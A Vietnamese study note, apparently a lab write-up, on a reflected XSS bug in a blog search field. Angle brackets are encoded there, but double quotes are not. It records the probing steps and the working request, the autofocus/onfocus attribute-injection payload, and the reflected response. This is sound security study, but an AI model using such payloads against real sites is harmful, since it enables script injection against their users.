![[reflected-attribute.png]]
lab search blog, input chui vào value="...", ngoặc nhọn bị encode nên không tạo thẻ mới được.

> [!NOTE] phân tích đề
> - đề cho search blog, input reflected vào `<input value="INPUT">`.
> - `<>` bị HTML-encode thành `&lt;` `&gt;`.
> - `"` thì không bị encode.
> - nên mình không tạo thẻ mới được, phải ở lại trong thẻ cũ + thêm event.
> - đọc thêm [[lys thuyet XSS]] + [[xss-filter bypass]].

### hướng giải
- [ ] nhập `x7Kp92Qa` -> response thấy `<input value="x7Kp92Qa">`.
- [ ] thử `<script>` -> bị encode, thất bại.
- [ ] thử `"` -> không bị encode -> thoát attribute được.
- [ ] thêm `autofocus onfocus` -> tự bắn không cần click.

### giải
request:
```http
GET /?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 HTTP/1.1
```

payload:
```html
" autofocus onfocus=alert(1) x="
```

response:
```html
<input value="" autofocus onfocus=alert(1) x="">
```

kết quả:
-> `autofocus` tự focus -> `onfocus` bắn -> alert(1) hiện.
![[reflected-attribute-result.png]]

> [!NOTE] bài học
> - sau khi quan sát lab này mình thấy... bị chặn `<>` không có nghĩa là hết cửa.
> => nên mình khi thấy attribute thì hỏi ngay: dấu nháy nào thoát được, event nào tự kích hoạt được.
